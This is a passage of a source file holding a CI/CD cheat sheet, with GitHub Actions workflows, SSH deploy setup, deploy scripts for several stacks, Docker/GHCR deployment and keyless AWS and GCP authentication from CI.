            │   └── shared/           shared TS code       or packages/shared changes
            ├── package.json          npm workspaces (apps/web, packages/*)
            ├── package-lock.json
            └── .github/workflows/
            `,
          note: 'Two ways to skip work: separate workflows with path filters (simple), or one workflow with a job that detects changes and if conditions on the others (one place to look, one required check).',
        },
        {
          title: 'Option A: one workflow per app with path filters',
          lang: 'yaml',
          code: c`
            # .github/workflows/api.yml
            name: API

            on:
              push:
                branches: [main]
                paths:
                  - 'apps/api/**'
                  - '.github/workflows/api.yml'
              pull_request:
                paths:
                  - 'apps/api/**'
                  - '.github/workflows/api.yml'

            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              test:
                runs-on: ubuntu-latest
                timeout-minutes: 15
                defaults:
                  run:
                    working-directory: apps/api
                env:
                  DB_CONNECTION: sqlite
                  DB_DATABASE: ':memory:'
                steps:
                  - uses: actions/checkout@v4
                  - uses: shivammathur/setup-php@v2
                    with:
                      php-version: '8.3'
                      extensions: mbstring, intl, pdo_sqlite
                      coverage: none
                  - run: composer install --no-interaction --prefer-dist --no-progress
                  - run: |
                      cp .env.example .env
                      php artisan key:generate
                  - run: php artisan test
            `,
          note: 'The workflow runs only if at least one changed file matches a pattern. Listing the workflow file itself means edits to the pipeline are tested too. working-directory applies to run steps only, not to uses steps.',
          then: [
            {
              label: '.github/workflows/web.yml',
              lang: 'yaml',
              code: c`
                name: Web

                on:
                  push:
                    branches: [main]
                    paths:
                      - 'apps/web/**'
                      - 'packages/shared/**'
                      - 'package-lock.json'
                      - '.github/workflows/web.yml'
                  pull_request:
                    paths:
                      - 'apps/web/**'
                      - 'packages/shared/**'
                      - 'package-lock.json'
                      - '.github/workflows/web.yml'

                concurrency:
                  group: ${GH} github.workflow }}-${GH} github.ref }}
                  cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

                permissions:
                  contents: read

                jobs:
                  build:
                    runs-on: ubuntu-latest
                    timeout-minutes: 15
                    steps:
                      - uses: actions/checkout@v4
                      - uses: actions/setup-node@v4
                        with:
                          node-version: 24
                          cache: npm
                          cache-dependency-path: package-lock.json
                      - run: npm ci
                      - run: npm run lint --workspace apps/web
                      - run: npm run typecheck --workspace apps/web
                      - run: npm test --workspace apps/web
                      - run: npm run build --workspace apps/web
                `,
            },
          ],
        },
        {
          title: 'Option B: one workflow, a changes job, and if conditions',
          lang: 'yaml',
          code: c`
            # .github/workflows/ci.yml
            name: CI

            on:
              push:
                branches: [main]
              pull_request:

            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: ${GH} github.event_name == 'pull_request' }}

            permissions:
              contents: read

            jobs:
              changes:
                runs-on: ubuntu-latest
                outputs:
                  api: ${GH} steps.diff.outputs.api }}
                  web: ${GH} steps.diff.outputs.web }}
                steps:
                  - uses: actions/checkout@v4
                    with:
                      fetch-depth: 0

                  - name: Detect changed folders
                    id: diff
                    env:
                      BASE: ${GH} github.event.pull_request.base.sha || github.event.before }}
                    run: |
                      if [ -z "$BASE" ] || [ "$BASE" = "0000000000000000000000000000000000000000" ] \
                        || ! CHANGED=$(git diff --name-only "$BASE" HEAD); then
                        echo "No usable base commit; running everything"
                        echo "api=true" >> "$GITHUB_OUTPUT"
                        echo "web=true" >> "$GITHUB_OUTPUT"
                        exit 0
                      fi
                      echo "$CHANGED"
                      matches() { echo "$CHANGED" | grep -qE "$1" && echo true || echo false; }
                      echo "api=$(matches '^(apps/api/|\.github/workflows/ci\.yml$)')" >> "$GITHUB_OUTPUT"
                      echo "web=$(matches '^(apps/web/|packages/shared/|package-lock\.json$|\.github/workflows/ci\.yml$)')" >> "$GITHUB_OUTPUT"

              api:
                needs: changes
                if: needs.changes.outputs.api == 'true'
                runs-on: ubuntu-latest
                timeout-minutes: 15
                defaults:
                  run:
                    working-directory: apps/api
                env:
                  DB_CONNECTION: sqlite
                  DB_DATABASE: ':memory:'
                steps:
                  - uses: actions/checkout@v4
                  - uses: shivammathur/setup-php@v2
                    with:
                      php-version: '8.3'
                      extensions: mbstring, intl, pdo_sqlite
                      coverage: none
                  - run: composer install --no-interaction --prefer-dist --no-progress
                  - run: |
                      cp .env.example .env
                      php artisan key:generate
                  - run: php artisan test

              web:
                needs: changes
                if: needs.changes.outputs.web == 'true'
                runs-on: ubuntu-latest
                timeout-minutes: 15
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci
                  - run: npm run lint --workspace apps/web
                  - run: npm run typecheck --workspace apps/web
                  - run: npm test --workspace apps/web
                  - run: npm run build --workspace apps/web

              # The single check to mark as required in branch protection
              ci-passed:
                if: always()
                needs: [changes, api, web]
                runs-on: ubuntu-latest
                steps:
                  - name: Fail if any job failed or was cancelled
                    if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
                    run: exit 1
                  - run: echo "All jobs passed or were skipped"
            `,
          note: 'The changes job compares the commit with the PR base (or with the previous commit on main) using plain git, then the other jobs read its outputs. When no base is available, such as the first push of a branch or a force push, everything runs to stay safe.',
        },
        {
          title: 'needs + if patterns for skipped jobs',
          lang: 'yaml',
          code: c`
            # Fragments of the jobs: block; runs-on and steps are left out for brevity

              # Default: if a needed job is skipped or fails, this job is skipped too
              deploy-web:
                needs: web
                if: github.ref == 'refs/heads/main'

              # Run when the needed jobs passed OR were skipped, but not if one failed
              e2e:
                needs: [api, web]
                if: >-
                  always()
                  && !contains(needs.*.result, 'failure')
                  && !contains(needs.*.result, 'cancelled')
                  && (needs.api.result == 'success' || needs.web.result == 'success')

              # Run no matter what (notifications, cleanup)
              notify:
                needs: [api, web]
                if: always()
            `,
          note: 'Every if silently includes success() unless it calls always(), failure() or cancelled() itself. That is why a job after a skipped job is also skipped until you add always() and check needs.*.result yourself.',
        },
        {
          title: 'Required checks and path filters',
          note: 'A workflow skipped by a paths filter never reports its checks, so a branch protection rule that requires them leaves the pull request waiting forever. With Option A, require only checks from workflows that always run. With Option B, require just ci-passed: a job skipped by an if counts as passing, and ci-passed fails if anything it depends on failed.',
        },
        {
          title: 'Skip CI for docs-only changes',
          lang: 'yaml',
          code: c`
            on:
              push:
                branches: [main]
                paths-ignore:
                  - '**.md'
                  - 'docs/**'
              pull_request:
                paths-ignore:
                  - '**.md'
                  - 'docs/**'
            `,
          note: 'paths and paths-ignore cannot be used together for the same event. To include a folder but exclude part of it, use paths with a pattern starting with an exclamation mark after the include.',
          then: [
            {
              label: 'Include apps/api but ignore its docs folder',
              lang: 'yaml',
              code: c`
                    paths:
                      - 'apps/api/**'
                      - '!apps/api/docs/**'
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'cd-ssh',
      title: 'Deploy over SSH',
      group: 'Deployment (CD)',
      items: [
        {
          title: '1. Create a dedicated deploy key',
          lang: 'bash',
          code: c`
            # macOS / Linux (Ubuntu / Debian): press Enter twice for no passphrase
            ssh-keygen -t ed25519 -C "github-actions-deploy" -f ~/.ssh/your-app-deploy
            `,
          note: 'Use a new key only for CI, never your personal key. CI cannot type a passphrase, so leave it empty; the private key will live only in GitHub secrets.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
                # press Enter twice for no passphrase
                ssh-keygen -t ed25519 -C "github-actions-deploy" -f "$HOME\.ssh\your-app-deploy"
                `,
            },
          ],
        },
        {
          title: '2. Authorize the key on the server',
          lang: 'bash',
          code: c`
            # macOS / Linux (Ubuntu / Debian)
            ssh-copy-id -i ~/.ssh/your-app-deploy.pub deploy@203.0.113.10

            # check it works (should print "ok" without a password prompt)
            ssh -i ~/.ssh/your-app-deploy deploy@203.0.113.10 echo ok
            `,
          note: 'The key is added to /home/deploy/.ssh/authorized_keys. The deploy user should own /var/www/app and have no sudo rights beyond the few commands deploy.sh needs.',
          then: [
            {
              label: 'Windows (PowerShell): no ssh-copy-id',
              lang: 'powershell',
              code: c`
                Get-Content "$HOME\.ssh\your-app-deploy.pub" | ssh deploy@203.0.113.10 "mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

                ssh -i "$HOME\.ssh\your-app-deploy" deploy@203.0.113.10 echo ok
                `,
            },
          ],
        },
        {
          title: '3. Store the key, host and known_hosts as secrets',
          lang: 'bash',
          code: c`
            # macOS / Linux (Ubuntu / Debian)
            gh secret set DEPLOY_SSH_KEY < ~/.ssh/your-app-deploy
            gh secret set DEPLOY_HOST --body "203.0.113.10"
            ssh-keyscan -H 203.0.113.10 | gh secret set DEPLOY_KNOWN_HOSTS
            `,
          note: 'DEPLOY_KNOWN_HOSTS pins the server\'s host key so CI never blindly trusts whatever answers on that IP. Compare the scanned fingerprint with the one printed on the server before saving it. Delete the local private key afterwards if you do not need it.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
                Get-Content -Raw "$HOME\.ssh\your-app-deploy" | gh secret set DEPLOY_SSH_KEY
                gh secret set DEPLOY_HOST --body "203.0.113.10"
                ssh-keyscan -H 203.0.113.10 | gh secret set DEPLOY_KNOWN_HOSTS
                `,
            },
            {
              label: 'Show the scanned fingerprint (same on every OS)',
              lang: 'bash',
              code: c`
                ssh-keyscan -t ed25519 203.0.113.10 | ssh-keygen -lf -
                `,
            },
            {
              label: 'Compare with the real one (run on the server)',
              lang: 'bash',
              code: c`
                ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub
                `,
            },
            {
              label: 'Optional: scope the secrets to the production environment (same on every OS)',
              lang: 'bash',
              code: c`
                gh api -X PUT repos/your-org/your-app/environments/production
                gh secret set DEPLOY_HOST --env production --body "203.0.113.10"
                gh secret set DEPLOY_SSH_KEY --env production < ~/.ssh/your-app-deploy    # PowerShell: pipe Get-Content -Raw as above
                `,
            },
          ],
        },
        {
          title: '4. Deploy job: after tests, one at a time',
          lang: 'yaml',
          code: c`
            # .github/workflows/ci.yml
            name: CI/CD
            on:
              push:
                branches: [main]
              pull_request:

            permissions:
              contents: read

            jobs:
              test:
                runs-on: ubuntu-latest
                steps:
                  - uses: actions/checkout@v4
                  - run: ./run-tests.sh            # your build / lint / test steps

              deploy:
                needs: test
                if: github.event_name == 'push' && github.ref == 'refs/heads/main'
                runs-on: ubuntu-latest
                environment:
                  name: production
                  url: https://example.com
                concurrency:
                  group: deploy-production
                  cancel-in-progress: false
                steps:
                  - name: Configure SSH
                    env:
                      SSH_KEY: ${GH} secrets.DEPLOY_SSH_KEY }}
                      KNOWN_HOSTS: ${GH} secrets.DEPLOY_KNOWN_HOSTS }}
                    run: |
                      install -m 700 -d ~/.ssh
                      printf '%s\n' "$SSH_KEY" | tr -d '\r' > ~/.ssh/deploy_key
                      chmod 600 ~/.ssh/deploy_key
                      printf '%s\n' "$KNOWN_HOSTS" | tr -d '\r' > ~/.ssh/known_hosts

                  - name: Run deploy.sh on the server
                    env:
                      HOST: ${GH} secrets.DEPLOY_HOST }}
                    run: ssh -i ~/.ssh/deploy_key -o IdentitiesOnly=yes deploy@"$HOST" "cd /var/www/app && ./deploy.sh $GITHUB_SHA"

                  - name: Smoke test
                    run: curl --fail --silent --show-error --retry 5 --retry-delay 5 --retry-all-errors --max-time 10 https://example.com/health
            `,
          note: 'needs: test stops a failing build from deploying, and the if: line skips deploys for pull requests. concurrency queues a second deploy instead of running two at once; cancel-in-progress: false means a running deploy is never killed halfway. The tr step strips Windows line endings, which otherwise break a key saved from PowerShell.',
        },
        {
          title: '5. Smoke test after the deploy',
          lang: 'yaml',
          code: c`
                  - name: Smoke test
                    run: curl --fail --silent --show-error --retry 5 --retry-delay 5 --retry-all-errors --max-time 10 https://example.com/health
            `,
          note: 'Keep this as the last step of the deploy job, as in step 4. --fail turns HTTP 4xx/5xx into a failed step, and the retries give the app a few seconds to start. Point it at a route that touches the database so a broken config is caught.',
        },
        {
          title: 'Keep deploy secrets away from pull request code',
          note: 'Pull requests from forks get no secrets and a read-only token, which is what you want. Do not switch to pull_request_target to get around that: it runs with your secrets and a write token, and checking out the pull request head there runs the contributor\'s code with them. Deploy only on push to main, on a tag, or by manual dispatch.',
        },
      ],
    },
    {
      id: 'cd-scripts',
      title: 'Deploy scripts the pipeline runs',
      group: 'Deployment (CD)',
      items: [
        {
          title: 'Laravel',
          lang: 'bash',
          code: c`
            #!/usr/bin/env bash
            # /var/www/app/deploy.sh: usage ./deploy.sh [commit-sha-or-tag]
            set -euo pipefail
            cd /var/www/app
            if [ $# -gt 0 ]; then REF="$1"; else REF=origin/main; fi

            php artisan down --retry=60 || true
            trap 'php artisan up' EXIT            # bring the site back even if a step fails

            git fetch --prune --tags origin
            git reset --hard "$REF"

            composer install --no-dev --no-interaction --prefer-dist --optimize-autoloader
            npm ci && npm run build               # Vite assets; skip if you build them in CI
            php artisan migrate --force
            php artisan optimize                  # caches config, routes, views, events
            php artisan queue:restart
            sudo systemctl reload php8.3-fpm      # clears OPcache
            `,
          note: 'git reset --hard makes the server match the exact commit CI tested, so never edit files on the server. .env and storage/ are untracked and survive the reset.',
        },
        {
          title: 'Node (PM2)',
          lang: 'bash',
          code: c`
            #!/usr/bin/env bash
            # /var/www/app/deploy.sh
            set -euo pipefail
            cd /var/www/app
            if [ $# -gt 0 ]; then REF="$1"; else REF=origin/main; fi

            git fetch --prune --tags origin
            git reset --hard "$REF"

            npm ci
            npm run build --if-present
            npm prune --omit=dev
            pm2 reload ecosystem.config.cjs --env production   # zero-downtime in cluster mode
            pm2 save
            `,
          note: 'pm2 reload restarts workers one by one, so requests keep flowing when exec_mode is cluster. pm2 save, together with a one-time pm2 startup, keeps the process list across server reboots.',
        },
        {
          title: 'Python (systemd)',
          lang: 'bash',
          code: c`
            #!/usr/bin/env bash
            # /var/www/app/deploy.sh: Django / FastAPI behind gunicorn or uvicorn
            set -euo pipefail
            cd /var/www/app
            if [ $# -gt 0 ]; then REF="$1"; else REF=origin/main; fi

            git fetch --prune --tags origin
            git reset --hard "$REF"

            .venv/bin/pip install --no-input -r requirements.txt
            .venv/bin/python manage.py migrate --noinput          # FastAPI: .venv/bin/alembic upgrade head
            .venv/bin/python manage.py collectstatic --noinput    # Django only
            sudo systemctl restart app
            sleep 3
            systemctl is-active --quiet app                       # fails if the service crashed on start
            `,
          note: 'Call the venv binaries directly instead of activating the venv. The last two lines give the service a moment to start and make the script fail if it did not stay up.',
        },
        {
          title: 'React / static SPA: build in CI, rsync, atomic swap',
          lang: 'bash',
          code: c`
            #!/usr/bin/env bash
            # scripts/deploy-static.sh: runs in CI after "npm run build"; usage: deploy-static.sh HOST
            set -euo pipefail
            HOST="$1"
            SSH="ssh -i $HOME/.ssh/deploy_key -o IdentitiesOnly=yes"
            BASE=/var/www/app
            RELEASE=$(date -u +%Y%m%d%H%M%S)

            $SSH deploy@"$HOST" "mkdir -p $BASE/releases/$RELEASE"
            rsync -az --delete -e "$SSH" dist/ deploy@"$HOST":$BASE/releases/$RELEASE/

            # swap the symlink in one step: visitors see the old or the new build, never half
            $SSH deploy@"$HOST" "ln -sfn $BASE/releases/$RELEASE $BASE/current.tmp && mv -Tf $BASE/current.tmp $BASE/current"

            # keep the 5 newest releases for quick rollback
            $SSH deploy@"$HOST" "cd $BASE/releases && ls -1t | tail -n +6 | xargs -r rm -rf"
            `,
          note: 'The server never runs npm. Point the web server at /var/www/app/current; rolling back is re-pointing the symlink at an older folder in releases/.',
          then: [
            {
              label: 'Workflow steps (in the deploy job, after the Configure SSH step)',
              lang: 'yaml',
              code: c`
                      - uses: actions/checkout@v4
                      - uses: actions/setup-node@v4
                        with:
                          node-version: 24
                          cache: npm
                      - run: npm ci
                      - run: npm run build
                      - run: ./scripts/deploy-static.sh "$HOST"
                        env:
                          HOST: ${GH} secrets.DEPLOY_HOST }}
                `,
            },
            {
              label: 'nginx',
              lang: 'nginx',
              code: c`
                server {
                    listen 80;
                    server_name example.com;
                    root /var/www/app/current;

                    location / { try_files $uri /index.html; }
                    location = /index.html { add_header Cache-Control "no-cache"; }
                    location /assets/ { add_header Cache-Control "public, max-age=31536000, immutable"; }
                }
                `,
            },
            {
              label: 'Roll back to the previous release (on the server)',
              lang: 'bash',
              code: c`
                cd /var/www/app/releases
                ls -1t                      # newest first
                ln -sfn /var/www/app/releases/20261017120000 /var/www/app/current.tmp && mv -Tf /var/www/app/current.tmp /var/www/app/current
                `,
            },
          ],
        },
        {
          title: 'Give the server read access to the repo',
          lang: 'bash',
          code: c`
            # on the server, as the deploy user
            ssh-keygen -t ed25519 -C "deploy@203.0.113.10" -f ~/.ssh/id_ed25519 -N ""
            cat ~/.ssh/id_ed25519.pub

            # on your machine (same on every OS), after saving that line as server.pub
            gh repo deploy-key add server.pub --repo your-org/your-app --title "prod 203.0.113.10"

            # on the server, once (confirm GitHub's host key fingerprint when asked)
            git clone git@github.com:your-org/your-app.git /var/www/app
            `,
          note: 'The git-based scripts pull code on the server, so the server needs its own deploy key. It is read-only unless you add --allow-write, and it is a different key from the one CI uses to log in.',
        },
        {
          title: 'Let deploy restart services without a password',
          lang: 'bash',
          code: c`
            # on the server
            sudo visudo -f /etc/sudoers.d/deploy
            `,
          note: 'CI has no terminal to type a sudo password. Allow only the exact commands the script runs, never ALL.',
          then: [
            {
              label: '/etc/sudoers.d/deploy: list exact commands only',
              lang: 'text',
              code: c`
                deploy ALL=(root) NOPASSWD: /usr/bin/systemctl reload php8.3-fpm, /usr/bin/systemctl restart app
                `,
            },
          ],
        },
        {
          title: 'Commit scripts as executable',
          lang: 'bash',
          code: c`
            # same on every OS (works on Windows, where chmod does not exist)
            git add --chmod=+x deploy.sh scripts/deploy-static.sh
            git commit -m "Make deploy scripts executable"
            `,
          note: 'Without the executable bit the pipeline fails with "Permission denied". Git stores the bit, so setting it once in the repo is enough.',
        },
      ],
    },
    {
      id: 'cd-docker',
      title: 'Docker: build, push to GHCR, pull on the server',
      group: 'Deployment (CD)',
      items: [
        {
          title: '1. Build and push to GitHub Container Registry',
          lang: 'yaml',
          code: c`
            # .github/workflows/docker.yml
            name: Docker
            on:
              push:
                branches: [main]
                tags: ['v*']

            permissions:
              contents: read

            jobs:
              image:
                runs-on: ubuntu-latest
                permissions:
                  contents: read
                  packages: write
                steps:
                  - uses: actions/checkout@v4
                  - uses: docker/setup-buildx-action@v3
                  - uses: docker/login-action@v3
                    with:
                      registry: ghcr.io
                      username: ${GH} github.actor }}
                      password: ${GH} secrets.GITHUB_TOKEN }}
                  - id: meta
                    uses: docker/metadata-action@v5
                    with:
                      images: ghcr.io/your-org/your-app
                      tags: |
                        type=sha,format=long
                        type=semver,pattern={{version}}
                        type=raw,value=latest,enable={{is_default_branch}}
                  - uses: docker/build-push-action@v6
                    with:
                      context: .
                      push: true
                      tags: ${GH} steps.meta.outputs.tags }}
                      labels: ${GH} steps.meta.outputs.labels }}
                      cache-from: type=gha
                      cache-to: type=gha,mode=max
            `,
          note: 'GITHUB_TOKEN can push to GHCR once packages: write is granted, so no extra secret is needed. Every image gets an immutable sha-<full commit> tag; deploy that, not latest, so you always know what is running. A v1.4.1 git tag becomes the image tag 1.4.1 (the v is dropped).',
        },
        {
          title: '2. Compose file on the server',
          lang: 'yaml',
          code: c`
            # /var/www/app/compose.yaml
            services:
              app:
                image: ghcr.io/your-org/your-app:$TAG
                restart: unless-stopped
                env_file: app.env
                ports:
                  - "127.0.0.1:8080:8080"
                healthcheck:
                  test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
                  interval: 10s
                  retries: 5
            `,
          note: 'Compose reads TAG from the .env file next to compose.yaml, so a deploy only rewrites that one line. App settings live in app.env, which stays on the server. The healthcheck needs curl inside the image; swap in wget or a small script if the image has no curl.',
          then: [
            {
              label: '/var/www/app/.env',
              lang: 'env',
              code: c`
                TAG=latest
                `,
            },
          ],
        },
        {
          title: '3. Let the server pull private images (once)',
          lang: 'bash',
          code: c`
            # on the server, as the deploy user; token = a classic PAT with only read:packages
            read -rsp 'GHCR token: ' GHCR_TOKEN; echo
            printf '%s' "$GHCR_TOKEN" | docker login ghcr.io -u your-github-user --password-stdin
            unset GHCR_TOKEN
            `,
          note: 'Skip this if the package is public. Reading the token at a hidden prompt keeps it out of shell history. The login is stored in the deploy user\'s ~/.docker/config.json and reused by every later pull.',
        },
        {
          title: '4. Deploy job: pull and restart over SSH',
          lang: 'yaml',
          code: c`
              deploy:
                needs: image
                if: github.ref == 'refs/heads/main'
                runs-on: ubuntu-latest
                environment:
                  name: production
                  url: https://example.com
                concurrency:
                  group: deploy-production
                  cancel-in-progress: false
                steps:
                  # ...Configure SSH step from "Deploy over SSH"...
                  - name: Pull and restart
                    env:
                      HOST: ${GH} secrets.DEPLOY_HOST }}
                      TAG: sha-${GH} github.sha }}
                    run: |
                      ssh -i ~/.ssh/deploy_key deploy@"$HOST" "cd /var/www/app \
                        && grep '^TAG=' .env > .previous-tag \
                        && sed -i 's/^TAG=.*/TAG=$TAG/' .env \
                        && docker compose pull \
                        && docker compose up -d --wait --remove-orphans \
                        && docker image prune -f"
                  - name: Smoke test
                    run: curl --fail --silent --show-error --retry 5 --retry-delay 5 --retry-all-errors --max-time 10 https://example.com/health
            `,
          note: 'Add this job under jobs: in docker.yml. $TAG is expanded on the runner before the command is sent. up -d --wait returns only when the healthcheck passes, so a crashing container fails the job. The old tag is saved in .previous-tag for a quick rollback, and prune removes only untagged images, so older tags stay available.',
        },
        {
          title: '5. Roll back to the previous tag',
          lang: 'bash',
          code: c`
            # on the server
            cd /var/www/app
            cat .previous-tag                         # e.g. TAG=sha-3f2c1e...
            cp .previous-tag .env
            docker compose up -d --wait

            # or pick any earlier image (semver tags have no leading v)
            docker image ls ghcr.io/your-org/your-app
            sed -i 's/^TAG=.*/TAG=1.4.1/' .env && docker compose pull && docker compose up -d --wait
            `,
          note: 'This assumes TAG is the only line in .env, as in step 2. Rolling back the image does not roll back database migrations; see the expand/contract item under Environments.',
        },
      ],
    },
    {
      id: 'cd-aws',
      title: 'AWS from CI (no access keys)',
      group: 'Deployment (CD)',
      items: [
        {
          title: '1. Add GitHub as an OIDC provider (once per account)',
          lang: 'bash',
          code: c`
            # same on every OS
            aws iam create-open-id-connect-provider --url https://token.actions.githubusercontent.com --client-id-list sts.amazonaws.com
            `,
          note: 'With OIDC, each workflow run gets short-lived credentials from AWS. There are no long-lived access keys to leak or rotate.',
        },
        {
          title: '2. Role that only your repo + environment can assume',
          lang: 'json',
          code: c`
            {
              "Version": "2012-10-17",
              "Statement": [
                {
                  "Effect": "Allow",
                  "Principal": {
                    "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
                  },
                  "Action": "sts:AssumeRoleWithWebIdentity",
                  "Condition": {
                    "StringEquals": {
                      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
                      "token.actions.githubusercontent.com:sub": "repo:your-org/your-app:environment:production"
                    }
                  }
                }
              ]
            }
            `,
          note: 'Save as trust.json. The sub condition means only jobs in your-org/your-app that run with environment: production can assume the role; forks and other repositories cannot. Which branches may use that environment is set by its branch rule (see Environments).',
          then: [
            {
              label: 'Create the role and give it permissions (same on every OS)',
              lang: 'bash',
              code: c`
                aws iam create-role --role-name github-deploy-your-app --assume-role-policy-document file://trust.json
                aws iam put-role-policy --role-name github-deploy-your-app --policy-name deploy --policy-document file://deploy-policy.json
                `,
            },
            {
              label: 'deploy-policy.json (S3 + CloudFront example)',
              lang: 'json',
              code: c`
                {
                  "Version": "2012-10-17",
                  "Statement": [
                    { "Effect": "Allow", "Action": "s3:ListBucket", "Resource": "arn:aws:s3:::your-app-site" },
                    { "Effect": "Allow", "Action": ["s3:PutObject", "s3:DeleteObject"], "Resource": "arn:aws:s3:::your-app-site/*" },
                    { "Effect": "Allow", "Action": "cloudfront:CreateInvalidation", "Resource": "arn:aws:cloudfront::123456789012:distribution/E1ABCDEF2GHIJK" }
                  ]
                }
                `,
            },
          ],
        },
        {
          title: '3. Assume the role in the workflow',
          lang: 'yaml',
          code: c`
            jobs:
              deploy:
                runs-on: ubuntu-latest
                environment: production
                permissions:
                  id-token: write      # lets the job request an OIDC token
                  contents: read
                steps:
                  - uses: actions/checkout@v4
                  - uses: aws-actions/configure-aws-credentials@v4
                    with:
                      role-to-assume: arn:aws:iam::123456789012:role/github-deploy-your-app
                      aws-region: eu-west-1
                  - run: aws sts get-caller-identity
            `,
          note: 'Without id-token: write the action cannot get a token and fails with "Credentials could not be loaded". environment: production must match the sub in the trust policy. Every later step in the job can use the aws CLI and SDKs.',
        },
        {
          title: 'S3 + CloudFront static site',
          lang: 'yaml',
          code: c`
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci && npm run build

                  - name: Upload (hashed assets cached forever, HTML always revalidated)
                    run: |
                      aws s3 sync dist/assets s3://your-app-site/assets --cache-control "public, max-age=31536000, immutable"
                      aws s3 sync dist s3://your-app-site --delete --exclude "assets/*" --cache-control "no-cache"

                  - name: Invalidate CloudFront
                    env:
                      DISTRIBUTION_ID: ${GH} vars.CLOUDFRONT_DISTRIBUTION_ID }}
                    run: aws cloudfront create-invalidation --distribution-id "$DISTRIBUTION_ID" --paths "/*"
            `,
          note: 'Old hashed assets are kept so visitors with a cached index.html still load. Store IDs that are not secret as repository variables (vars.*), not secrets.',
        },
        {
          title: 'EC2 without SSH: run deploy.sh via SSM',
          lang: 'yaml',
          code: c`
                  - name: Run deploy.sh via SSM
                    env:
                      INSTANCE: ${GH} vars.EC2_INSTANCE_ID }}
                    run: |
                      PARAMS=$(jq -nc --arg sha "$GITHUB_SHA" '{commands: ["sudo -u deploy /var/www/app/deploy.sh " + $sha]}')
                      CMD_ID=$(aws ssm send-command --document-name AWS-RunShellScript \
                        --instance-ids "$INSTANCE" --parameters "$PARAMS" \
                        --comment "deploy $GITHUB_SHA" --query Command.CommandId --output text)
                      aws ssm wait command-executed --command-id "$CMD_ID" --instance-id "$INSTANCE" || true
                      aws ssm get-command-invocation --command-id "$CMD_ID" --instance-id "$INSTANCE" \
                        --query '[Status, StandardOutputContent, StandardErrorContent]' --output text
                      test "$(aws ssm get-command-invocation --command-id "$CMD_ID" --instance-id "$INSTANCE" --query Status --output text)" = Success
            `,
          note: 'The instance needs the SSM agent and an instance role with AmazonSSMManagedInstanceCore; the CI role needs ssm:SendCommand and ssm:GetCommandInvocation. No inbound port 22 is required. The waiter gives up after about 100 seconds, which is why the last line checks the final status.',
        },
        {
          title: 'Push an image to ECR',
          lang: 'yaml',
          code: c`
                  - uses: aws-actions/configure-aws-credentials@v4
                    with:
                      role-to-assume: arn:aws:iam::123456789012:role/github-deploy-your-app
                      aws-region: eu-west-1
                  - name: Log in to ECR
                    run: aws ecr get-login-password | docker login --username AWS --password-stdin 123456789012.dkr.ecr.eu-west-1.amazonaws.com
                  - uses: docker/setup-buildx-action@v3
                  - uses: docker/build-push-action@v6
                    with:
                      context: .
                      push: true
                      tags: 123456789012.dkr.ecr.eu-west-1.amazonaws.com/your-app:${GH} github.sha }}
                      cache-from: type=gha
                      cache-to: type=gha,mode=max
            `,
          note: 'The role needs ecr:GetAuthorizationToken plus push actions on the repository (the managed policy AmazonEC2ContainerRegistryPowerUser covers it). ECS or App Runner can then deploy that tag.',
          then: [
            {
              label: 'Create the ECR repository once (same on every OS)',
              lang: 'bash',
              code: c`
                aws ecr create-repository --repository-name your-app --region eu-west-1 --image-tag-mutability IMMUTABLE
                `,
            },
          ],
        },
      ],
    },
    {
      id: 'cd-gcp',
      title: 'GCP from CI (no key files)',
      group: 'Deployment (CD)',
      items: [
        {
          title: '1. Set variables',
          lang: 'bash',
          code: c`
            # macOS / Linux (bash, zsh)
            PROJECT_ID=your-project
            PROJECT_NUMBER=$(gcloud projects describe $PROJECT_ID --format="value(projectNumber)")
            REPO=your-org/your-app
            SA=github-deploy@$PROJECT_ID.iam.gserviceaccount.com
            `,
          note: 'The gcloud commands in the next steps are one line each and use only $NAME variables, so they run unchanged in bash, zsh and PowerShell once these variables are set.',
          then: [
            {
              label: 'Windows (PowerShell)',
              lang: 'powershell',
              code: c`
                $PROJECT_ID = "your-project"
                $PROJECT_NUMBER = gcloud projects describe $PROJECT_ID --format="value(projectNumber)"
                $REPO = "your-org/your-app"
                $SA = "github-deploy@$PROJECT_ID.iam.gserviceaccount.com"
                `,
            },
          ],
        },
        {
          title: '2. Enable the APIs, create the identity pool and GitHub provider',
          lang: 'bash',
          code: c`
            # bash / zsh / PowerShell
            gcloud services enable iam.googleapis.com iamcredentials.googleapis.com sts.googleapis.com cloudresourcemanager.googleapis.com run.googleapis.com artifactregistry.googleapis.com --project=$PROJECT_ID

            gcloud iam workload-identity-pools create github --project=$PROJECT_ID --location=global --display-name="GitHub Actions"

            gcloud iam workload-identity-pools providers create-oidc your-app --project=$PROJECT_ID --location=global --workload-identity-pool=github --display-name="your-app repo" --issuer-uri="https://token.actions.githubusercontent.com" --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository,attribute.ref=assertion.ref" --attribute-condition="assertion.repository=='$REPO'"
            `,
          note: 'The attribute condition rejects tokens from every other repository, even ones in your organisation. A deleted pool or provider ID stays reserved for 30 days, so pick names you will keep.',
        },
        {
          title: '3. Service account and binding',
          lang: 'bash',
          code: c`
            # bash / zsh / PowerShell
            gcloud iam service-accounts create github-deploy --project=$PROJECT_ID --display-name="GitHub deploy"

            gcloud projects add-iam-policy-binding $PROJECT_ID --member="serviceAccount:$SA" --role="roles/run.developer"
            gcloud projects add-iam-policy-binding $PROJECT_ID --member="serviceAccount:$SA" --role="roles/artifactregistry.writer"
